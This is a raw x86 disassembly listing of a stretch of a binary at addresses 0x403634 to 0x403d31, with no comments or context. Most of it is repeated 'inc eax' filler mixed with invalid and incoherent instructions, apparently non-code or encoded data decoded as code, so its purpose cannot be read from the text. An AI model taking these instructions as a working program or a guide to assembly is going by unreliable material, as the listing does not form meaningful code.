  403634:	inc    eax
  403635:	sbb    BYTE PTR [edi+0x40],ah
  403638:	inc    eax
  403639:	add    BYTE PTR [eax+0x40],al
  40363c:	inc    eax
  40363d:	inc    eax
  40363e:	inc    eax
  40363f:	inc    eax
  403640:	jo     0x40365a
  403642:	and    al,0x99
  403644:	jmp    DWORD PTR [eax+0x8]
  403647:	xor    al,0x4
  403649:	stc    
  40364a:	adc    dh,BYTE PTR [ebx+0x75]
  40364d:	pop    ecx
  40364e:	inc    ebx
  40364f:	sbb    al,0x40
  403652:	inc    eax
  403653:	inc    eax
  403654:	inc    eax
  403655:	inc    eax
  403656:	inc    eax
  403657:	inc    eax
  403658:	inc    eax
  403659:	inc    eax
  40365a:	inc    eax
  40365b:	bound  ebp,QWORD PTR [eax-0x78]
  40365e:	add    DWORD PTR [eax+0x45],0xffffffc5
  403662:	pusha  
  403663:	arpl   WORD PTR [ecx],dx
  403665:	jae    0x4036ba
  403667:	and    DWORD PTR [eax],esp
  403669:	push   eax
  40366a:	cld    
  40366b:	and    bl,cl
  40366d:	lock add DWORD PTR [ebx],ebp
  403670:	add    BYTE PTR [edx+0x66],0x6a
  403674:	inc    eax
  403675:	inc    eax
  403676:	inc    eax
  403677:	inc    eax
  403678:	inc    eax
  403679:	inc    eax
  40367a:	int3   
  40367b:	jne    0x4036bd
  40367d:	dec    eax
  40367e:	jno    0x4036b5
  403680:	inc    eax
  403681:	test   al,0x50
  403683:	inc    esp
  403684:	lods   al,BYTE PTR ds:[esi]
  403685:	inc    edx
  403686:	call   0x627c:0xc8bf1704
  40368d:	jnp    0x4036cf
  40368f:	mov    ecx,0x73982aea
  403694:	and    eax,0x434040dc
  403699:	inc    ecx
  40369a:	test   al,0xd
  40369c:	(bad)  
  40369d:	retf   
  40369e:	inc    eax
  40369f:	sub    DWORD PTR [eax+0x0],eax
  4036a2:	rol    DWORD PTR [eax+0x40],0x40
  4036a6:	inc    eax
  4036a7:	add    BYTE PTR [eax+0x46],al
  4036aa:	jge    0x4036bc
  4036ac:	leave  
  4036ad:	push   esp
  4036ae:	xor    DWORD PTR [eax],esp
  4036b0:	pop    ecx
  4036b1:	dec    edx
  4036b2:	sbb    al,0x48
  4036b4:	inc    edx
  4036b5:	sbb    bh,BYTE PTR ds:0x62400140
  4036bb:	add    al,BYTE PTR [ecx-0x19be46cb]
  4036c1:	dec    ebp
  4036c2:	mov    ds:0x4040c3cb,al
  4036c7:	inc    eax
  4036c8:	inc    eax
  4036c9:	inc    eax
  4036ca:	inc    eax
  4036cb:	inc    eax
  4036cc:	inc    eax
  4036cd:	inc    DWORD PTR [eax+0x52]
  4036d0:	mov    al,0x60
  4036d2:	add    DWORD PTR [eax-0x45],eax
  4036d5:	dec    eax
  4036d6:	mov    ah,0xb0
  4036d8:	bound  eax,QWORD PTR [eax-0x5d]
  4036db:	imul   ebp,DWORD PTR [eax+0x40404044],0x40404040
  4036e5:	inc    eax
  4036e6:	inc    eax
  4036e7:	inc    eax
  4036e8:	inc    ebx
  4036e9:	adc    eax,0x406b7e45
  4036ee:	mov    edi,0x30cbf541
  4036f3:	mov    esp,0x40402d81
  4036f8:	inc    eax
  4036f9:	inc    eax
  4036fa:	inc    eax
  4036fb:	inc    eax
  4036fc:	inc    eax
  4036fd:	inc    eax
  4036fe:	add    BYTE PTR [edi-0x6faf13cc],bh
  403704:	jle    0x403748
  403706:	ror    BYTE PTR [ebx+eax*1],0x44
  40370a:	inc    ecx
  40370b:	add    eax,0x107981ac
  403710:	mov    ah,0x7c
  403712:	jl     0x40369b
  403714:	jge    0x403764
  403716:	inc    eax
  403717:	test   al,0x65
  403719:	rol    BYTE PTR [bx+si-0x7a],1
  40371d:	inc    eax
  40371e:	inc    eax
  40371f:	inc    eax
  403720:	inc    eax
  403721:	inc    eax
  403722:	inc    eax
  403723:	and    eax,0x80404040
  403728:	xor    al,0x45
  40372a:	add    BYTE PTR [eax+0x64],0x41
  40372e:	jge    0x403751
  403730:	(bad)  [esi]
  403732:	ret    
  403733:	aam    0x46
  403735:	stc    
  403736:	out    0x79,al
  403738:	inc    ecx
  403739:	inc    edi
  40373a:	mov    esp,0x7dd42468
  40373f:	add    ecx,edx
  403741:	xor    BYTE PTR [ebx+0x3a626144],ch
  403747:	mov    BYTE PTR [eax-0x28],0xdb
  40374b:	jl     0x4037c9
  40374d:	sub    DWORD PTR [eax+0x40],eax
  403750:	inc    eax
  403751:	inc    eax
  403752:	inc    eax
  403753:	inc    eax
  403754:	inc    eax
  403755:	inc    eax
  403756:	inc    eax
  403757:	inc    eax
  403758:	jge    0x4036dc
  40375a:	das    
  40375b:	bound  edi,QWORD PTR [bp+si-0x2f]
  40375f:	fsubr  DWORD PTR [eax]
  403761:	adc    bl,ah
  403763:	ret    0x40bd
  403766:	inc    eax
  403767:	inc    eax
  403768:	inc    eax
  403769:	inc    eax
  40376a:	inc    eax
  40376b:	rol    DWORD PTR [eax+0x40],0x85
  40376f:	arpl   WORD PTR [ebx+0x7d],cx
  403772:	adc    cl,BYTE PTR [eax+0x4e]
  403775:	jl     0x4037af
  403777:	test   ax,0x9e07
  40377b:	push   0x284f63a8
  403780:	xchg   esi,eax
  403781:	jge    0x403730
  403783:	inc    eax
  403784:	nop
  403785:	inc    eax
  403786:	inc    eax
  403787:	add    BYTE PTR [eax+0x40],al
  40378a:	inc    eax
  40378b:	inc    eax
  40378c:	inc    eax
  40378d:	inc    eax
  40378e:	sub    BYTE PTR [edx+edx*8-0xb91816e],dh
  403795:	inc    ecx
  403796:	cmp    al,0x85
  403798:	sub    BYTE PTR [ebp+edi*2+0x40],cl
  40379c:	pop    ds
  40379d:	dec    eax
  40379e:	inc    eax
  40379f:	inc    eax
  4037a0:	inc    eax
  4037a1:	inc    eax
  4037a2:	inc    eax
  4037a3:	inc    eax
  4037a4:	inc    eax
  4037a5:	inc    eax
  4037a6:	inc    eax
  4037a7:	inc    eax
  4037a8:	xor    DWORD PTR [edx],edi
  4037aa:	jae    0x4037e0
  4037ac:	jae    0x4037ae
  4037ae:	xor    esp,ebp
  4037b0:	fiadd  DWORD PTR [esp+esi*1+0x40]
  4037b4:	jae    0x4037e2
  4037b6:	inc    esp
  4037b7:	push   ebx
  4037b8:	les    edi,FWORD PTR [eax+ebp*2+0x6c]
  4037bc:	mov    eax,ds:0xc0496f44
  4037c1:	inc    esp
  4037c2:	jp     0x4037fc
  4037c4:	jae    0x4037c6
  4037c6:	pop    ebx
  4037c7:	and    al,0x4d
  4037c9:	pusha  
  4037ca:	inc    eax
  4037cb:	inc    eax
  4037cc:	inc    eax
  4037cd:	inc    eax
  4037ce:	inc    eax
  4037cf:	inc    eax
  4037d0:	int3   
  4037d1:	jne    0x403813
  4037d3:	push   ebx
  4037d4:	ret    
  4037d5:	push   0x17
  4037d7:	inc    ebp
  4037d8:	imul   DWORD PTR [ecx]
  4037da:	test   DWORD PTR [ecx+0x48],0xab614a73
  4037e1:	xor    eax,0x40a461
  4037e6:	rol    DWORD PTR [eax+0x40],0x40
  4037ea:	inc    eax
  4037eb:	add    BYTE PTR [eax+0x5],al
  4037ee:	add    al,BYTE PTR fs:[eax+0x5]
  4037f2:	fnstsw WORD PTR ds:0x7345
  4037f7:	xor    BYTE PTR [edi],ah
  4037f9:	ret    0xf785
  4037fc:	jnp    0x403879
  4037fe:	dec    ebx
  4037ff:	add    dh,BYTE PTR [ecx+0x52]
  403802:	bound  eax,QWORD PTR [ebp+edi*8+0x28]
  403806:	inc    eax
  403807:	inc    eax
  403808:	inc    eax
  403809:	inc    eax
  40380a:	inc    eax
  40380b:	inc    eax
  40380c:	inc    eax
  40380d:	inc    eax
  40380e:	inc    DWORD PTR [eax+0x72]
  403811:	add    BYTE PTR [eax+0x49],al
  403814:	dec    eax
  403815:	jge    0x403879
  403817:	bound  edi,QWORD PTR [ebx+0x11382f15]
  40381d:	imul   ecx,ebx,0x1a32407f
  403823:	adc    esp,DWORD PTR [ebp+0x404008f7]
  403829:	inc    eax
  40382a:	inc    eax
  40382b:	inc    eax
  40382c:	inc    eax
  40382d:	inc    eax
  40382e:	inc    eax
  40382f:	inc    eax
  403830:	inc    eax
  403831:	les    eax,FWORD PTR [eax+0x21]
  403834:	push   ebx
  403835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403836:	gs inc esp
  403838:	xor    eax,0x4080404f
  40383d:	test   al,0xbc
  40383f:	jge    0x4037c1
  403841:	inc    edi
  403842:	fs pusha 
  403844:	and    DWORD PTR [eax+0x40],eax
  403847:	inc    eax
  403848:	inc    eax
  403849:	inc    eax
  40384a:	inc    eax
  40384b:	inc    eax
  40384c:	inc    eax
  40384d:	add    BYTE PTR [eax+0x43],al
  403850:	imul   eax,ebp,0x47ec4037
  403856:	add    DWORD PTR [ecx-0x6],ecx
  403859:	xchg   ecx,eax
  40385a:	inc    ecx
  40385b:	inc    ecx
  40385c:	add    al,BYTE PTR [eax+0x21]
  40385f:	push   esp
  403860:	xor    al,0x43
  403862:	and    al,0x50
  403864:	sub    eax,0x40404324
  403869:	inc    eax
  40386a:	inc    eax
  40386b:	inc    eax
  40386c:	inc    eax
  40386d:	and    eax,0xc4404040
  403872:	inc    esp
  403873:	add    al,0x5c
  403875:	inc    eax
  403876:	pusha  
  403877:	dec    edi
  403878:	pop    edx
  403879:	dec    edi
  40387a:	jl     0x403840
  40387c:	add    bh,BYTE PTR [esi+0x40]
  40387f:	inc    eax
  403880:	inc    eax
  403881:	inc    eax
  403882:	inc    eax
  403883:	inc    eax
  403884:	inc    eax
  403885:	inc    eax
  403886:	inc    eax
  403887:	inc    eax
  403888:	add    eax,DWORD PTR [eax+0x2c]
  40388b:	imul   edi,DWORD PTR [ecx+0x62],0x30d71587
  403892:	ins    DWORD PTR es:[edi],dx
  403893:	and    al,BYTE PTR [ebp-0x7e81b7d0]
  403899:	inc    ebx
  40389a:	nop
  40389b:	gs clc 
  40389d:	dec    edx
  40389e:	adc    eax,0x6240536c
  4038a3:	inc    esi
  4038a4:	inc    esp
  4038a5:	rol    DWORD PTR [edx+0x7e],1
  4038a8:	sub    BYTE PTR [ebx],0x64
  4038ab:	enter  0x407c,0x40
  4038af:	inc    eax
  4038b0:	inc    eax
  4038b1:	inc    eax
  4038b2:	inc    eax
  4038b3:	rol    DWORD PTR [eax+0x40],0x13
  4038b7:	inc    ecx
  4038b8:	push   esi
  4038b9:	pop    ss
  4038ba:	jmp    0x7dc4:0x4a6c2624
  4038c1:	sub    al,0xea
  4038c3:	inc    ebp
  4038c4:	cwde   
  4038c5:	inc    ecx
  4038c6:	icebp  
  4038c7:	pop    eax
  4038c8:	scas   al,BYTE PTR es:[edi]
  4038c9:	xor    al,BYTE PTR [eax-0x79]
  4038cc:	inc    eax
  4038cd:	inc    eax
  4038ce:	add    BYTE PTR [eax+0x40],al
  4038d1:	inc    eax
  4038d2:	inc    eax
  4038d3:	inc    eax
  4038d4:	inc    eax
  4038d5:	test   al,0xb8
  4038d7:	add    al,0x53
  4038d9:	jge    0x4038dc
  4038db:	aaa    
  4038dc:	dec    edx
  4038dd:	push   esp
  4038de:	mov    al,ds:0x62e7cd88
  4038e3:	inc    eax
  4038e4:	xor    eax,0x50624441
  4038e9:	jns    0x40386c
  4038eb:	outs   dx,BYTE PTR ds:[esi]
  4038ec:	inc    ecx
  4038ed:	inc    eax
  4038ee:	inc    eax
  4038ef:	inc    eax
  4038f0:	inc    eax
  4038f1:	inc    eax
  4038f2:	inc    eax
  4038f3:	inc    eax
  4038f4:	inc    eax
  4038f5:	inc    eax
  4038f6:	inc    eax
  4038f7:	mov    ah,0x7d
  4038f9:	mov    ebp,cr3
  4038fc:	ins    BYTE PTR es:[edi],dx
  4038fd:	mov    ds:0xe46b30e5,al
  403902:	push   eax
  403903:	inc    eax
  403904:	add    DWORD PTR [ecx-0x4],0x4040b4f3
  40390b:	inc    eax
  40390c:	inc    eax
  40390d:	inc    eax
  40390e:	inc    eax
  40390f:	int3   
  403910:	jne    0x403952
  403912:	bound  esi,QWORD PTR [eax]
  403914:	inc    eax
  403915:	adc    BYTE PTR [edx+0x62],al
  403918:	test   eax,0x4021d6af
  40391d:	add    DWORD PTR [eax-0x42],eax
  403920:	mov    eax,0x541acc44
  403925:	pusha  
  403926:	outs   dx,DWORD PTR ds:[esi]
  403927:	pop    ds
  403928:	pop    eax
  403929:	jle    0x40398e
  40392b:	call   0xa8969270
  403930:	mov    edi,0x41194c47
  403935:	push   edx
  403936:	inc    eax
  403937:	pop    ss
  403938:	inc    eax
  403939:	add    cl,al
  40393b:	inc    eax
  40393c:	inc    eax
  40393d:	inc    eax
  40393e:	inc    eax
  40393f:	add    BYTE PTR [eax+0x6c],al
  403942:	pusha  
  403943:	mov    edi,0xcd8940c0
  403948:	xor    al,0xd5
  40394a:	adc    eax,0x3940e345
  40394f:	xor    BYTE PTR [edx-0x6c],al
  403952:	fsub   QWORD PTR [ebx-0x55]
  403955:	jbe    0x4039ae
  403957:	inc    edx
  403958:	pop    ebp
  403959:	dec    eax
  40395a:	jle    0x4039cd
  40395c:	inc    edx
  40395d:	mov    edi,0x653c4001
  403962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403963:	loopne 0x40393f
  403965:	jne    0x403992
  403967:	inc    eax
  403968:	inc    eax
  403969:	inc    eax
  40396a:	inc    eax
  40396b:	inc    eax
  40396c:	inc    eax
  40396d:	inc    eax
  40396e:	inc    eax
  40396f:	inc    DWORD PTR [eax+0x34]
  403972:	clc    
  403973:	mov    ebp,0x67769bf
  403978:	adc    DWORD PTR [esi+0x68],0xf0c5bf63
  40397f:	je     0x403953
  403981:	inc    edx
  403982:	mov    esp,0xa8c4bf16
  403987:	xchg   BYTE PTR [eax],al
  403989:	jp     0x4039c9
  40398b:	test   BYTE PTR [esi],al
  40398d:	dec    edi
  40398e:	adc    DWORD PTR [ebx+0x74],esi
  403991:	inc    esi
  403992:	bound  esp,QWORD PTR [edi-0x57]
  403995:	inc    eax
  403996:	inc    eax
  403997:	inc    eax
  403998:	inc    eax
  403999:	inc    eax
  40399a:	inc    eax
  40399b:	inc    eax
  40399c:	inc    eax
  40399d:	inc    eax
  40399e:	inc    eax
  40399f:	pusha  
  4039a0:	test   al,0xec
  4039a2:	aas    
  4039a3:	inc    eax
  4039a4:	push   esp
  4039a5:	dec    esi
  4039a6:	jmp    0x40394b
  4039a8:	or     eax,0x40320240
  4039ad:	and    BYTE PTR [eax+0x40],al
  4039b0:	inc    eax
  4039b1:	inc    eax
  4039b2:	inc    eax
  4039b3:	inc    eax
  4039b4:	inc    eax
  4039b5:	inc    eax
  4039b6:	add    BYTE PTR [ebx+0x6040cb8e],ch
  4039bc:	cli    
  4039bd:	jno    0x4039e8
  4039bf:	mov    ah,0x90
  4039c1:	dec    esi
  4039c2:	inc    eax
  4039c3:	pop    es
  4039c4:	inc    ecx
  4039c5:	imul   ebx
  4039c7:	inc    ebp
  4039c8:	push   ebx
  4039c9:	stos   DWORD PTR es:[edi],eax
  4039ca:	push   eax
  4039cb:	adc    DWORD PTR ds:0x8854a83c,0x561d4042
  4039d5:	clc    
  4039d6:	or     al,al
  4039d8:	test   al,0x34
  4039da:	inc    eax
  4039db:	inc    eax
  4039dc:	inc    eax
  4039dd:	inc    eax
  4039de:	inc    eax
  4039df:	inc    eax
  4039e0:	and    eax,0x40404040
  4039e5:	add    BYTE PTR [eax+0x75],0x7b
  4039e9:	mov    ah,0x53
  4039eb:	inc    eax
  4039ec:	mov    al,0xab
  4039ee:	and    al,0xa8
  4039f0:	(bad)  
  4039f2:	sub    bl,BYTE PTR [eax+0x405e1340]
  4039f8:	add    eax,0x783d52cd
  4039fd:	inc    eax
  4039fe:	inc    eax
  4039ff:	sub    bh,BYTE PTR [ecx+eax*2-0x58]
  403a03:	ret    
  403a04:	test   DWORD PTR [eax+0x40],eax
  403a07:	inc    eax
  403a08:	inc    eax
  403a09:	inc    eax
  403a0a:	inc    eax
  403a0b:	inc    eax
  403a0c:	inc    eax
  403a0d:	inc    eax
  403a0e:	inc    eax
  403a0f:	adc    dh,BYTE PTR ds:0x15d3554f
  403a15:	cwde   
  403a16:	je     0x403a5f
  403a18:	cmp    dh,BYTE PTR [esi]
  403a1a:	jae    0x4039e9
  403a1c:	leave  
  403a1d:	add    eax,0x414082c1
  403a22:	pushf  
  403a23:	push   esp
  403a24:	dec    edx
  403a25:	inc    eax
  403a26:	inc    eax
  403a27:	inc    eax
  403a28:	inc    eax
  403a29:	inc    eax
  403a2a:	inc    eax
  403a2b:	rol    DWORD PTR [eax+0x40],0xc9
  403a2f:	inc    eax
  403a30:	and    esp,DWORD PTR [esi]
  403a32:	mov    eax,0x4f4cab54
  403a37:	inc    eax
  403a38:	das    
  403a39:	(bad)  
  403a3a:	ret    
  403a3b:	mov    esi,0x40421542
  403a40:	add    DWORD PTR [edx+0x47],eax
  403a43:	mov    esp,0x4cc02b34
  403a48:	inc    eax
  403a49:	and    al,BYTE PTR [edx-0x60]
  403a4c:	inc    ecx
  403a4d:	inc    eax
  403a4e:	std    
  403a4f:	inc    eax
  403a50:	add    dl,ch
  403a52:	inc    eax
  403a53:	inc    eax
  403a54:	add    BYTE PTR [eax+0x40],al
  403a57:	inc    eax
  403a58:	inc    eax
  403a59:	inc    eax
  403a5a:	inc    eax
  403a5b:	enter  0x40a8,0x40
  403a5f:	push   edi
  403a60:	inc    eax
  403a61:	and    bl,BYTE PTR [esi]
  403a63:	add    al,BYTE PTR [ecx-0x2c]
  403a66:	inc    eax
  403a67:	mov    esp,0x40404040
  403a6c:	inc    eax
  403a6d:	inc    eax
  403a6e:	inc    eax
  403a6f:	inc    eax
  403a70:	inc    eax
  403a71:	inc    eax
  403a72:	mov    al,ds:0x4b444256
  403a77:	ins    BYTE PTR es:[edi],dx
  403a78:	in     eax,0x3a
  403a7a:	inc    eax
  403a7b:	pop    ebp
  403a7c:	and    DWORD PTR [eax+0x40486e34],ebp
  403a82:	inc    eax
  403a83:	inc    eax
  403a84:	inc    eax
  403a85:	inc    eax
  403a86:	inc    eax
  403a87:	int3   
  403a88:	jne    0x403aca
  403a8a:	bound  esi,QWORD PTR [eax+eax*1+0x40]
  403a8e:	adc    ah,ah
  403a90:	stos   DWORD PTR es:[edi],eax
  403a91:	inc    ebx
  403a92:	retf   
  403a93:	nop
  403a94:	xor    BYTE PTR [ebx],ah
  403a96:	pusha  
  403a97:	dec    ebp
  403a98:	test   al,0xa4
  403a9a:	inc    edx
  403a9b:	je     0x403af0
  403a9d:	bound  edx,QWORD PTR [eax]
  403a9f:	inc    ebx
  403aa0:	jns    0x403b0e
  403aa2:	inc    eax
  403aa3:	add    cl,al
  403aa5:	inc    eax
  403aa6:	inc    eax
  403aa7:	inc    eax
  403aa8:	inc    eax
  403aa9:	add    BYTE PTR [eax-0x37],al
  403aac:	pop    edi
  403aad:	add    DWORD PTR [eax-0x35],eax
  403ab0:	dec    eax
  403ab1:	and    ecx,eax
  403ab3:	dec    eax
  403ab4:	inc    eax
  403ab5:	push   edi
  403ab6:	js     0x403a77
  403ab8:	or     BYTE PTR [eax-0x7fbfea18],ah
  403abe:	inc    eax
  403abf:	mov    edi,0xcb5f0dcb
  403ac4:	inc    eax
  403ac5:	and    DWORD PTR [edx+eax*8+0x43],esi
  403ac9:	inc    eax
  403aca:	inc    eax
  403acb:	inc    eax
  403acc:	inc    eax
  403acd:	inc    eax
  403ace:	inc    eax
  403acf:	inc    eax
  403ad0:	inc    eax
  403ad1:	inc    DWORD PTR [eax+0x7b]
  403ad4:	out    0x43,al
  403ad6:	dec    esp
  403ad7:	inc    ebp
  403ad8:	enter  0x7c2d,0xd5
  403adc:	add    DWORD PTR [ebx+0x40],0x4ca84000
  403ae3:	sub    eax,DWORD PTR [eax+0x40]
  403ae6:	inc    eax
  403ae7:	inc    eax
  403ae8:	inc    eax
  403ae9:	inc    eax
  403aea:	inc    eax
  403aeb:	inc    eax
  403aec:	inc    eax
  403aed:	inc    eax
  403aee:	mov    ah,dl
  403af0:	inc    eax
  403af1:	sub    BYTE PTR [eax-0x7],dh
  403af4:	bound  ecx,QWORD PTR [edi+0x62]
  403af7:	cmp    eax,0xab404390
  403afc:	inc    esp
  403afd:	sar    al,0xb8
  403b00:	inc    eax
  403b01:	add    DWORD PTR [edx+0x4b],esi
  403b04:	jl     0x403ab2
  403b06:	mov    eax,0x40f57ba8
  403b0b:	dec    edx
  403b0c:	dec    ebp
  403b0d:	add    eax,0x40404040
  403b12:	inc    eax
  403b13:	inc    eax
  403b14:	inc    eax
  403b15:	inc    eax
  403b16:	add    BYTE PTR [edx+0x11],ah
  403b19:	ror    BYTE PTR [ecx],0x6d
  403b1c:	fsub   DWORD PTR [ebx-0x35]
  403b1f:	sbb    eax,DWORD PTR [ecx+0x72]
  403b22:	add    al,BYTE PTR [eax+0x7c]
  403b25:	inc    esp
  403b26:	dec    ecx
  403b27:	and    BYTE PTR [esp+eiz*2],al
  403b2a:	pusha  
  403b2b:	add    edi,edx
  403b2d:	sub    dh,BYTE PTR ds:0x4c402c43
  403b33:	inc    eax
  403b34:	test   al,0xf6
  403b36:	inc    edx
  403b37:	ins    BYTE PTR es:[edi],dx
  403b38:	add    al,BYTE PTR [eax+0x40]
  403b3b:	inc    eax
  403b3c:	inc    eax
  403b3d:	inc    eax
  403b3e:	inc    eax
  403b3f:	and    eax,0x40404040
  403b44:	add    DWORD PTR [eax+0x11],eax
  403b47:	sub    al,BYTE PTR [ebx+0x4640c952]
  403b4d:	adc    ecx,DWORD PTR [eax+0x62]
  403b50:	fdivr  st,st(2)
  403b52:	inc    eax
  403b53:	inc    eax
  403b54:	inc    eax
  403b55:	inc    eax
  403b56:	inc    eax
  403b57:	inc    eax
  403b58:	inc    eax
  403b59:	inc    eax
  403b5a:	inc    eax
  403b5b:	inc    eax
  403b5c:	test   al,0x4c
  403b5e:	xchg   DWORD PTR [eax-0x35],eax
  403b61:	inc    ebx
  403b62:	mov    ah,0xec
  403b64:	dec    edx
  403b65:	inc    eax
  403b66:	dec    esp
  403b67:	adc    bh,BYTE PTR [eax-0x389df2d0]
  403b6d:	inc    eax
  403b6e:	add    BYTE PTR [eax+eax*2+0x40],ch
  403b72:	inc    eax
  403b73:	inc    eax
  403b74:	inc    eax
  403b75:	inc    eax
  403b76:	rol    DWORD PTR [eax+0x40],0x5
  403b7a:	inc    eax
  403b7b:	retf   
  403b7c:	inc    ebx
  403b7d:	jg     0x403aff
  403b7f:	and    DWORD PTR [eax+0x45],eax
  403b82:	test   al,0x42
  403b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b85:	xor    al,0x40
  403b87:	cmp    BYTE PTR [edi],ah
  403b89:	dec    ebx
  403b8a:	adc    BYTE PTR [ecx+0x69],al
  403b8d:	inc    eax
  403b8e:	jnp    0x403b12
  403b90:	or     al,0xd8
  403b92:	imul   edx,DWORD PTR ds:0x40400c40,0x40404000
  403b9c:	inc    eax
  403b9d:	inc    eax
  403b9e:	inc    eax
  403b9f:	shr    DWORD PTR [edi],cl
  403ba1:	inc    eax
  403ba2:	cmp    al,0xaf
  403ba4:	xor    al,0x40
  403ba6:	jecxz  0x403c23
  403ba8:	cli    
  403ba9:	sub    DWORD PTR [edx+eiz*2+0x265740cb],esi
  403bb0:	dec    edi
  403bb1:	dec    edx
  403bb2:	arpl   WORD PTR [ebp+0xc],ax
  403bb5:	sahf   
  403bb6:	fdivr  QWORD PTR [ebx-0x7f]
  403bb9:	push   esp
  403bba:	call   0x40807bff
  403bbf:	inc    eax
  403bc0:	inc    eax
  403bc1:	inc    eax
  403bc2:	inc    eax
  403bc3:	inc    eax
  403bc4:	inc    eax
  403bc5:	inc    ebx
  403bc6:	xor    al,0xc4
  403bc8:	inc    ebx
  403bc9:	sbb    eax,0x484b4049
  403bce:	mov    DWORD PTR [edi+0x36],ecx
  403bd1:	jnp    0x403b55
  403bd3:	xor    eax,0x43c503b9
  403bd8:	test   al,0x7f
  403bda:	and    esp,DWORD PTR [esp+ecx*2-0x1d]
  403bde:	inc    edx
  403bdf:	pop    es
  403be0:	adc    DWORD PTR [ebx+0x4c],edi
  403be3:	inc    eax
  403be4:	and    BYTE PTR [edx+0x52],ah
  403be7:	sub    BYTE PTR [edx+eiz*2+0x40404040],bl
  403bee:	inc    eax
  403bef:	inc    eax
  403bf0:	int3   
  403bf1:	jne    0x403c33
  403bf3:	add    al,0x33
  403bf5:	ror    ebx,cl
  403bf7:	and    al,0x7b
  403bf9:	or     eax,0x3440217a
  403bfe:	cld    
  403bff:	stc    
  403c00:	cmp    al,0xcb
  403c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c03:	inc    edi
  403c04:	cmp    DWORD PTR [edx+0x5d],esp
  403c07:	push   ds
  403c08:	bound  ebx,QWORD PTR [edx+edi*2+0x62e0f801]
  403c0f:	xor    DWORD PTR [edi+0x45],ebx
  403c12:	inc    eax
  403c13:	add    cl,al
  403c15:	inc    eax
  403c16:	inc    eax
  403c17:	inc    eax
  403c18:	inc    eax
  403c19:	add    BYTE PTR [eax-0x3],al
  403c1c:	jo     0x403c5e
  403c1e:	xor    al,0x44
  403c20:	lods   al,BYTE PTR ds:[esi]
  403c21:	in     al,0x7b
  403c23:	jp     0x403c26
  403c25:	sub    ebx,DWORD PTR [esi+0x2a]
  403c28:	add    eax,0x52f6c001
  403c2d:	loop   0x403c62
  403c2f:	add    BYTE PTR [eax+0x40],0x40
  403c33:	inc    eax
  403c34:	inc    eax
  403c35:	inc    eax
  403c36:	inc    eax
  403c37:	inc    eax
  403c38:	inc    DWORD PTR [eax-0x79]
  403c3b:	fs pushf 
  403c3d:	jp     0x403c40
  403c3f:	inc    eax
  403c40:	sub    eax,0x7b52b4da
  403c45:	icebp  
  403c46:	xchg   edi,eax
  403c47:	pusha  
  403c48:	bound  esp,QWORD PTR [edx+0x5]
  403c4b:	test   eax,0x38557a21
  403c50:	jb     0x403cab
  403c52:	leave  
  403c53:	lods   al,BYTE PTR ds:[esi]
  403c54:	sbb    esp,edi
  403c56:	add    DWORD PTR [eax-0x30],0x4067b028
  403c5d:	inc    eax
  403c5e:	inc    eax
  403c5f:	inc    eax
  403c60:	inc    eax
  403c61:	inc    eax
  403c62:	inc    eax
  403c63:	inc    eax
  403c64:	inc    eax
  403c65:	inc    eax
  403c66:	int3   
  403c67:	jp     0x403c75
  403c69:	das    
  403c6a:	out    0x5d,eax
  403c6c:	add    eax,0xd7e005c6
  403c71:	inc    eax
  403c72:	retf   0x4040
  403c75:	inc    eax
  403c76:	inc    eax
  403c77:	inc    eax
  403c78:	inc    eax
  403c79:	inc    eax
  403c7a:	inc    eax
  403c7b:	add    BYTE PTR [eax+0x7a8762cb],ch
  403c81:	add    ebp,DWORD PTR [ecx]
  403c83:	ins    DWORD PTR es:[edi],dx
  403c84:	or     edi,DWORD PTR [eax-0x3e28712a]
  403c8a:	inc    eax
  403c8b:	arpl   WORD PTR [edx],si
  403c8d:	adc    eax,0x1d7a9a38
  403c92:	inc    eax
  403c93:	inc    eax
  403c94:	inc    eax
  403c95:	inc    eax
  403c96:	inc    eax
  403c97:	inc    eax
  403c98:	and    eax,0x34404040
  403c9d:	jle    0x403caa
  403c9f:	leave  
  403ca0:	pop    eax
  403ca1:	out    dx,eax
  403ca2:	rol    cl,1
  403ca4:	pusha  
  403ca5:	xor    al,0x2c
  403ca7:	mov    esp,0x107a309c
  403cac:	inc    eax
  403cad:	sbb    al,BYTE PTR [eax+0x40]
  403cb0:	inc    eax
  403cb1:	inc    eax
  403cb2:	inc    eax
  403cb3:	inc    eax
  403cb4:	inc    eax
  403cb5:	inc    eax
  403cb6:	inc    eax
  403cb7:	inc    eax
  403cb8:	bound  edx,QWORD PTR ds:0xc0c59860
  403cbe:	xor    BYTE PTR [esi+0x60cdcbb0],ch
  403cc4:	jp     0x403cda
  403cc6:	inc    eax
  403cc7:	push   edi
  403cc8:	jbe    0x403cf2
  403cca:	fnstsw WORD PTR [ebp+0x4b39163f]
  403cd0:	and    DWORD PTR ds:0xc17a638d,esi
  403cd6:	inc    eax
  403cd7:	clc    
  403cd8:	inc    eax
  403cd9:	inc    eax
  403cda:	inc    eax
  403cdb:	inc    eax
  403cdc:	inc    eax
  403cdd:	inc    eax
  403cde:	rol    DWORD PTR [eax+0x40],0xb0
  403ce2:	xchg   ecx,eax
  403ce3:	sbb    BYTE PTR [eax],dl
  403ce5:	ss (bad) 
  403ce7:	xor    al,BYTE PTR [eax+0x15]
  403cea:	jnp    0x403d55
  403cec:	dec    eax
  403ced:	jp     0x403cb3
  403cef:	inc    eax
  403cf0:	xchg   ecx,ecx
  403cf2:	dec    eax
  403cf3:	retf   
  403cf4:	add    ch,BYTE PTR [edx]
  403cf6:	mov    ebx,0xfe69b823
  403cfb:	inc    esp
  403cfc:	xchg   DWORD PTR [edx+0x73],edi
  403cff:	inc    eax
  403d00:	inc    eax
  403d01:	add    BYTE PTR [eax+0x40],al
  403d04:	inc    eax
  403d05:	inc    eax
  403d06:	inc    eax
  403d07:	inc    eax
  403d08:	inc    eax
  403d09:	add    eax,0x417c4ffb
  403d0e:	and    al,0x40
  403d10:	inc    eax
  403d11:	retf   
  403d12:	bound  esi,QWORD PTR [eax+0x717929ee]
  403d18:	cs adc ch,al
  403d1b:	add    eax,0xdae92c62
  403d20:	jo     0x403d56
  403d22:	push   esp
  403d23:	retf   
  403d24:	mov    ch,0xd5
  403d26:	jns    0x403cea
  403d28:	inc    eax
  403d29:	inc    esi
  403d2a:	retf   
  403d2b:	push   ecx
  403d2c:	scas   eax,DWORD PTR es:[edi]
  403d2d:	test   BYTE PTR [eax+0x40],al
  403d30:	inc    eax
  403d31:	inc    eax
